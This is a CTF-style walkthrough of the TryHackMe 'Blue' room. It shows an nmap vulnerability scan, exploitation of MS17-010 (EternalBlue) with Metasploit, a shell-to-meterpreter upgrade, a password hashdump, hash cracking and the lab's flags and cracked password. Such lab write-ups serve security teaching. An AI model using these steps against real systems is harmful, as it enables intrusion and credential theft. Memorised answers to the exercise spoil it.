
# [Blue](https://tryhackme.com/room/blue) Writeup :

## Recon:

### Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room):

nmap  -sV machineIP --script="vuln" 


### How many ports are open with a port number under 1000?

3


### What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067):

ms17-010

## Gain Access:

### Start Metasploit:
msfconsole

### Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........):
exploit/windows/smb/ms17_010_eternalblue


### Show options and set the one required value. What is the name of this value? (All caps for submission)
RHOSTS

![msf](https://user-images.githubusercontent.com/90579213/136675380-b4ccb6b7-1dbd-406d-bf97-d17913e3a504.JPG)

![exploit](https://user-images.githubusercontent.com/90579213/136675406-e027aa9e-12f3-4446-bb53-a87b6f148a85.JPG)


##  Escalate:

### If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) :

post/multi/manage/shell_to_meterpreter

### Select this (use MODULE_PATH). Show options, what option are we required to change?:

session

![use_post](https://user-images.githubusercontent.com/90579213/136675529-a173f573-a99a-4c35-ad7e-d7a3ba92c191.JPG)



### Set the required option, you may need to list all of the sessions to find your target here.

![sessions](https://user-images.githubusercontent.com/90579213/136675570-cf7cd211-7de0-408c-a1ad-6803a2b4068f.JPG)


### Run! If this doesn't work, try completing the exploit from the previous task once more . Once the meterpreter shell conversion completes, select that session for use.

![meterpreter](https://user-images.githubusercontent.com/90579213/136675587-d43cc76c-5bb3-47a4-a9f1-d25d53faf1ad.JPG)

### Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

![whoami](https://user-images.githubusercontent.com/90579213/136675597-21eb5c50-b92d-4ca1-949f-29ef633e7bc7.JPG)


### Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

![ps](https://user-images.githubusercontent.com/90579213/136675644-db8bdfa9-05b5-4b30-864a-b6468bcae2e8.JPG)


![migrate](https://user-images.githubusercontent.com/90579213/136675675-26418ef2-3e1c-4f21-afdd-d1e7d48913ac.JPG)


## Cracking:


### Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

![hashdump](https://user-images.githubusercontent.com/90579213/136675710-3399f83d-1faf-45ee-9b1d-383803eb263f.JPG)

jon


### Copy this password hash to a file and research how to crack it. What is the cracked password? I used [crackstation](https://crackstation.net) 

![crack](https://user-images.githubusercontent.com/90579213/136676066-69df96af-69c5-4bb4-9f2c-e9e4221b1691.JPG)

alqfna22

## Find flags!:


### Flag1? This flag can be found at the system root. 

cd C://

cat flag1.txt -> flag{access_the_machine}


### Flag2? This flag can be found at the location where passwords are stored within Windows.

cd C://Windows//System32//Config

cat flag2.txt ->


### flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

search flag3.*

![flag3](https://user-images.githubusercontent.com/90579213/136676170-268fd0b7-ada2-43d8-a40c-7b1dee03531c.JPG)

cat c://Users//Jon//Documents//flag3.txt -> flag{admin_documents_can_be_valuable}




